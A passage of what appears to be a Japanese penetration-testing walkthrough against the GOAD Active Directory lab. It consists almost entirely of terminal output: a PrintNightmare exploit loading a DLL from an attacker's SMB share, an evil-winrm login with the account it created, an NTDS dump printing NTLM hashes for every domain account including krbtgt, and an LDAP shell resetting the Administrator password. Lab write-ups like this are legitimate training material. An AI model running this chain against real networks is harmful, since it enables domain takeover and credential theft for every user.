</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Connecting</span> <span class=nx>to</span> <span class=nx>ncacn_np</span><span class=o>:</span><span class=nx>meereen</span><span class=p>.</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>[</span><span class=err>\</span><span class=nx>PIPE</span><span class=err>\</span><span class=nx>spoolss</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Bind</span> <span class=nx>OK</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>pDriverPath</span> <span class=nx>Found</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Windows</span><span class=err>\</span><span class=nx>System32</span><span class=err>\</span><span class=nx>DriverStore</span><span class=err>\</span><span class=nx>FileRepository</span><span class=err>\</span><span class=nx>ntprint</span><span class=p>.</span><span class=nx>inf_amd64_e233a12d01c18082</span><span class=err>\</span><span class=nx>Amd64</span><span class=err>\</span><span class=nx>UNIDRV</span><span class=p>.</span><span class=nx>DLL</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Executing</span> <span class=err>\</span><span class=o>??</span><span class=err>\</span><span class=nx>UNC</span><span class=err>\</span><span class=mf>192.168.56.104</span><span class=err>\</span><span class=nx>ATTACKSHARE</span><span class=err>\</span><span class=nx>nightmare</span><span class=p>.</span><span class=nx>dll</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Try</span> <span class=mf>1.</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Stage0</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Try</span> <span class=mf>2.</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Stage0</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Stage2</span><span class=o>:</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Exploit</span> <span class=nx>Completed</span>
</span></span></code></pre></div><p><code>pnightmare/Passw0rd123.</code> をゲット</p><p>evil-winrmで侵入すると実行できたことがわかる</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/printnightmare/printnightmare]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>evil</span><span class=o>-</span><span class=nx>winrm</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>pnightmare</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>Passw0rd123</span><span class=p>.</span> <span class=o>-</span><span class=nx>i</span> <span class=nx>meereen</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl><span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span> <span class=nx>shell</span> <span class=nx>v3</span><span class=mf>.5</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl><span class=nx>Warning</span><span class=o>:</span> <span class=nx>Remote</span> <span class=nx>path</span> <span class=nx>completions</span> <span class=nx>is</span> <span class=nx>disabled</span> <span class=nx>due</span> <span class=nx>to</span> <span class=nx>ruby</span> <span class=nx>limitation</span><span class=o>:</span> <span class=nx>quoting_detection_proc</span><span class=p>()</span> <span class=kd>function</span> <span class=nx>is</span> <span class=nx>unimplemented</span> <span class=nx>on</span> <span class=k>this</span> <span class=nx>machine</span>
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl><span class=nx>Data</span><span class=o>:</span> <span class=nx>For</span> <span class=nx>more</span> <span class=nx>information</span><span class=p>,</span> <span class=nx>check</span> <span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span> <span class=nx>GitHub</span><span class=o>:</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=c1></span>                                        
</span></span><span class=line><span class=cl><span class=nx>Info</span><span class=o>:</span> <span class=nx>Establishing</span> <span class=nx>connection</span> <span class=nx>to</span> <span class=nx>remote</span> <span class=nx>endpoint</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span><span class=o>*</span> <span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>pnightmare</span><span class=err>\</span><span class=nx>Documents</span><span class=o>&gt;</span> <span class=nx>whoami</span> <span class=o>/</span><span class=nx>priv</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>PRIVILEGES</span> <span class=nx>INFORMATION</span>
</span></span><span class=line><span class=cl><span class=o>----------------------</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Privilege</span> <span class=nx>Name</span>                            <span class=nx>Description</span>                                                        <span class=nx>State</span>
</span></span><span class=line><span class=cl><span class=o>=========================================</span> <span class=o>==================================================================</span> <span class=o>=======</span>
</span></span><span class=line><span class=cl><span class=nx>SeIncreaseQuotaPrivilege</span>                  <span class=nx>Adjust</span> <span class=nx>memory</span> <span class=nx>quotas</span> <span class=k>for</span> <span class=nx>a</span> <span class=nx>process</span>                                 <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeMachineAccountPrivilege</span>                 <span class=nx>Add</span> <span class=nx>workstations</span> <span class=nx>to</span> <span class=nx>domain</span>                                         <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeSecurityPrivilege</span>                       <span class=nx>Manage</span> <span class=nx>auditing</span> <span class=nx>and</span> <span class=nx>security</span> <span class=nx>log</span>                                   <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeTakeOwnershipPrivilege</span>                  <span class=nx>Take</span> <span class=nx>ownership</span> <span class=k>of</span> <span class=nx>files</span> <span class=nx>or</span> <span class=nx>other</span> <span class=nx>objects</span>                           <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeLoadDriverPrivilege</span>                     <span class=nx>Load</span> <span class=nx>and</span> <span class=nx>unload</span> <span class=nx>device</span> <span class=nx>drivers</span>                                     <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeSystemProfilePrivilege</span>                  <span class=nx>Profile</span> <span class=nx>system</span> <span class=nx>performance</span>                                         <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeSystemtimePrivilege</span>                     <span class=nx>Change</span> <span class=nx>the</span> <span class=nx>system</span> <span class=nx>time</span>                                             <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeProfileSingleProcessPrivilege</span>           <span class=nx>Profile</span> <span class=nx>single</span> <span class=nx>process</span>                                             <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeIncreaseBasePriorityPrivilege</span>           <span class=nx>Increase</span> <span class=nx>scheduling</span> <span class=nx>priority</span>                                       <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeCreatePagefilePrivilege</span>                 <span class=nx>Create</span> <span class=nx>a</span> <span class=nx>pagefile</span>                                                  <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeBackupPrivilege</span>                         <span class=nx>Back</span> <span class=nx>up</span> <span class=nx>files</span> <span class=nx>and</span> <span class=nx>directories</span>                                      <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeRestorePrivilege</span>                        <span class=nx>Restore</span> <span class=nx>files</span> <span class=nx>and</span> <span class=nx>directories</span>                                      <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeShutdownPrivilege</span>                       <span class=nx>Shut</span> <span class=nx>down</span> <span class=nx>the</span> <span class=nx>system</span>                                               <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeDebugPrivilege</span>                          <span class=nx>Debug</span> <span class=nx>programs</span>                                                     <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeSystemEnvironmentPrivilege</span>              <span class=nx>Modify</span> <span class=nx>firmware</span> <span class=nx>environment</span> <span class=nx>values</span>                                 <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeChangeNotifyPrivilege</span>                   <span class=nx>Bypass</span> <span class=nx>traverse</span> <span class=nx>checking</span>                                           <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeRemoteShutdownPrivilege</span>                 <span class=nx>Force</span> <span class=nx>shutdown</span> <span class=nx>from</span> <span class=nx>a</span> <span class=nx>remote</span> <span class=nx>system</span>                                <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeUndockPrivilege</span>                         <span class=nx>Remove</span> <span class=nx>computer</span> <span class=nx>from</span> <span class=nx>docking</span> <span class=nx>station</span>                               <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeEnableDelegationPrivilege</span>               <span class=nx>Enable</span> <span class=nx>computer</span> <span class=nx>and</span> <span class=nx>user</span> <span class=nx>accounts</span> <span class=nx>to</span> <span class=nx>be</span> <span class=nx>trusted</span> <span class=k>for</span> <span class=nx>delegation</span>     <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeManageVolumePrivilege</span>                   <span class=nx>Perform</span> <span class=nx>volume</span> <span class=nx>maintenance</span> <span class=nx>tasks</span>                                   <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeImpersonatePrivilege</span>                    <span class=nx>Impersonate</span> <span class=nx>a</span> <span class=nx>client</span> <span class=nx>after</span> <span class=nx>authentication</span>                          <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeCreateGlobalPrivilege</span>                   <span class=nx>Create</span> <span class=nx>global</span> <span class=nx>objects</span>                                              <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeIncreaseWorkingSetPrivilege</span>             <span class=nx>Increase</span> <span class=nx>a</span> <span class=nx>process</span> <span class=nx>working</span> <span class=nx>set</span>                                     <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeTimeZonePrivilege</span>                       <span class=nx>Change</span> <span class=nx>the</span> <span class=nx>time</span> <span class=nx>zone</span>                                               <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeCreateSymbolicLinkPrivilege</span>             <span class=nx>Create</span> <span class=nx>symbolic</span> <span class=nx>links</span>                                              <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=nx>SeDelegateSessionUserImpersonatePrivilege</span> <span class=nx>Obtain</span> <span class=nx>an</span> <span class=nx>impersonation</span> <span class=nx>token</span> <span class=k>for</span> <span class=nx>another</span> <span class=nx>user</span> <span class=k>in</span> <span class=nx>the</span> <span class=nx>same</span> <span class=nx>session</span> <span class=nx>Enabled</span>
</span></span><span class=line><span class=cl><span class=o>*</span><span class=nx>Evil</span><span class=o>-</span><span class=nx>WinRM</span><span class=o>*</span> <span class=nx>PS</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Users</span><span class=err>\</span><span class=nx>pnightmare</span><span class=err>\</span><span class=nx>Documents</span><span class=o>&gt;</span>
</span></span></code></pre></div><p>というわけでNTLMハッシュをいただく</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/printnightmare/printnightmare]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>smb</span> <span class=nx>meereen</span><span class=p>.</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>pnightmare</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>Passw0rd123</span><span class=p>.</span> <span class=o>--</span><span class=nx>ntds</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>the</span> <span class=nx>ntds</span> <span class=nx>can</span> <span class=nx>crash</span> <span class=nx>the</span> <span class=nx>DC</span> <span class=nx>on</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mf>2019.</span> <span class=nx>Use</span> <span class=nx>the</span> <span class=nx>option</span> <span class=o>--</span><span class=nx>user</span> <span class=p>&lt;</span><span class=nt>user</span><span class=p>&gt;</span> <span class=nx>to</span> <span class=nx>dump</span> <span class=nx>a</span> <span class=nx>specific</span> <span class=nx>user</span> <span class=nx>safely</span> <span class=nx>or</span> <span class=nx>the</span> <span class=nx>module</span> <span class=o>-</span><span class=nx>M</span> <span class=nx>ntdsutil</span> <span class=p>[</span><span class=nx>Y</span><span class=o>/</span><span class=nx>n</span><span class=p>]</span> 
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>MEEREEN</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>pnightmare</span><span class=o>:</span><span class=nx>Passw0rd123</span><span class=p>.</span> <span class=p>(</span><span class=nx>Pwn3d</span><span class=o>!</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Dumping</span> <span class=nx>the</span> <span class=nx>NTDS</span><span class=p>,</span> <span class=k>this</span> <span class=nx>could</span> <span class=nx>take</span> <span class=nx>a</span> <span class=k>while</span> <span class=nx>so</span> <span class=nx>go</span> <span class=nx>grab</span> <span class=nx>a</span> <span class=nx>redbull</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>Administrator</span><span class=o>:</span><span class=mi>500</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>54296</span><span class=nx>a48cd30259cc88095373cec24da</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>Guest</span><span class=o>:</span><span class=mi>501</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>krbtgt</span><span class=o>:</span><span class=mi>502</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>54798535</span><span class=nx>f08dafb2f3ab805bb312961d</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>DefaultAccount</span><span class=o>:</span><span class=mi>503</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>31</span><span class=nx>d6cfe0d16ae931b73c59d7e0c089c0</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>vagrant</span><span class=o>:</span><span class=mi>1000</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>e02bc503339d51f71d913c245d35b50b</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>daenerys</span><span class=p>.</span><span class=nx>targaryen</span><span class=o>:</span><span class=mi>1112</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>34534854</span><span class=nx>d33b398b66684072224bb47a</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>viserys</span><span class=p>.</span><span class=nx>targaryen</span><span class=o>:</span><span class=mi>1113</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>d96a55df6bef5e0b4d6d956088036097</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>khal</span><span class=p>.</span><span class=nx>drogo</span><span class=o>:</span><span class=mi>1114</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>739120</span><span class=nx>ebc4dd940310bc4bb5c9d37021</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>jorah</span><span class=p>.</span><span class=nx>mormont</span><span class=o>:</span><span class=mi>1115</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>4</span><span class=nx>d737ec9ecf0b9955a161773cfed9611</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>missandei</span><span class=o>:</span><span class=mi>1116</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>1</span><span class=nx>b4fd18edf477048c7a7c32fda251cec</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>drogon</span><span class=o>:</span><span class=mi>1117</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>195</span><span class=nx>e021e4c0ae619f612fb16c5706bb6</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>sql_svc</span><span class=o>:</span><span class=mi>1118</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>84</span><span class=nx>a5092f53390ea48d660be52b93b804</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>pnightmare</span><span class=o>:</span><span class=mi>1121</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>58</span><span class=nx>cf12d7448ca3ea7da502c83ee6a31e</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>MEEREEN$</span><span class=o>:</span><span class=mi>1001</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=nx>f05997d79fa50e0346a4d593d8eb1741</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>BRAAVOS$</span><span class=o>:</span><span class=mi>1104</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>0</span><span class=nx>d8d114e49ff85a35b3c97208d88dcf3</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>gmsaDragon$</span><span class=o>:</span><span class=mi>1119</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>563</span><span class=nx>b455a419089dfbfa829cab9f2b174</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>removemiccomputer$</span><span class=o>:</span><span class=mi>1120</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>1</span><span class=nx>e986d18a9b7c9543e2d57944e8656b7</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=nx>SEVENKINGDOMS$</span><span class=o>:</span><span class=mi>1105</span><span class=o>:</span><span class=nx>aad3b435b51404eeaad3b435b51404ee</span><span class=o>:</span><span class=mi>743</span><span class=nx>ab45cdf64d2f368f501fd348ab3d8</span><span class=o>:::</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Dumped</span> <span class=mi>18</span> <span class=nx>NTDS</span> <span class=nx>hashes</span> <span class=nx>to</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=p>.</span><span class=nx>nxc</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>MEEREEN_192</span><span class=mf>.168.56.12</span><span class=nx>_2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>20</span><span class=nx>_143124</span><span class=p>.</span><span class=nx>ntds</span> <span class=k>of</span> <span class=nx>which</span> <span class=mi>13</span> <span class=nx>were</span> <span class=nx>added</span> <span class=nx>to</span> <span class=nx>the</span> <span class=nx>database</span>                                                                                                                               
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>To</span> <span class=nx>extract</span> <span class=nx>only</span> <span class=nx>enabled</span> <span class=nx>accounts</span> <span class=nx>from</span> <span class=nx>the</span> <span class=nx>output</span> <span class=nx>file</span><span class=p>,</span> <span class=nx>run</span> <span class=nx>the</span> <span class=nx>following</span> <span class=nx>command</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>cat</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=p>.</span><span class=nx>nxc</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>MEEREEN_192</span><span class=mf>.168.56.12</span><span class=nx>_2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>20</span><span class=nx>_143124</span><span class=p>.</span><span class=nx>ntds</span> <span class=o>|</span> <span class=nx>grep</span> <span class=o>-</span><span class=nx>iv</span> <span class=nx>disabled</span> <span class=o>|</span> <span class=nx>cut</span> <span class=o>-</span><span class=nx>d</span> <span class=s1>&#39;:&#39;</span> <span class=o>-</span><span class=nx>f1</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>grep</span> <span class=o>-</span><span class=nx>iv</span> <span class=nx>disabled</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=p>.</span><span class=nx>nxc</span><span class=o>/</span><span class=nx>logs</span><span class=o>/</span><span class=nx>MEEREEN_192</span><span class=mf>.168.56.12</span><span class=nx>_2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>20</span><span class=nx>_143124</span><span class=p>.</span><span class=nx>ntds</span> <span class=o>|</span> <span class=nx>cut</span> <span class=o>-</span><span class=nx>d</span> <span class=s1>&#39;:&#39;</span> <span class=o>-</span><span class=nx>f1</span>
</span></span></code></pre></div><p>Administratorグループの権限を得ているがついでなのでAdministratorのパスワードを変更して入る</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl>                                                                                                                                                            
</span></span><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/printnightmare/printnightmare]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>ldap_shell</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=o>/</span><span class=nx>pnightmare</span> <span class=o>-</span><span class=nx>dc</span><span class=o>-</span><span class=nx>host</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span>  
</span></span><span class=line><span class=cl><span class=nx>Password</span><span class=o>:</span> 
</span></span><span class=line><span class=cl><span class=err>\</span><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Starting</span> <span class=nx>interactive</span> <span class=nx>shell</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=nx>pnightmare</span><span class=err>#</span>
</span></span><span class=line><span class=cl><span class=nx>pnightmare</span><span class=err>#</span> <span class=nx>change_password</span> <span class=nx>Administrator</span> <span class=nx>P</span><span class=err>@</span><span class=nx>ssw0rd</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Sending</span> <span class=nx>StartTLS</span> <span class=nx>command</span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>StartTLS</span> <span class=nx>succeded</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Got</span> <span class=nx>User</span> <span class=nx>DN</span><span class=o>:</span> <span class=nx>CN</span><span class=o>=</span><span class=nx>Administrator</span><span class=p>,</span><span class=nx>CN</span><span class=o>=</span><span class=nx>Users</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>essos</span><span class=p>,</span><span class=nx>DC</span><span class=o>=</span><span class=nx>local</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Attempting</span> <span class=nx>to</span> <span class=nx>set</span> <span class=k>new</span> <span class=nx>password</span> <span class=k>of</span><span class=o>:</span> <span class=nx>P</span><span class=err>@</span><span class=nx>ssw0rd</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>Password</span> <span class=nx>changed</span> <span class=nx>successfully</span><span class=o>!</span>
</span></span></code></pre></div><p><code>Administrator/P@ssw0rd!</code> をゲット</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/printnightmare/printnightmare]</span>
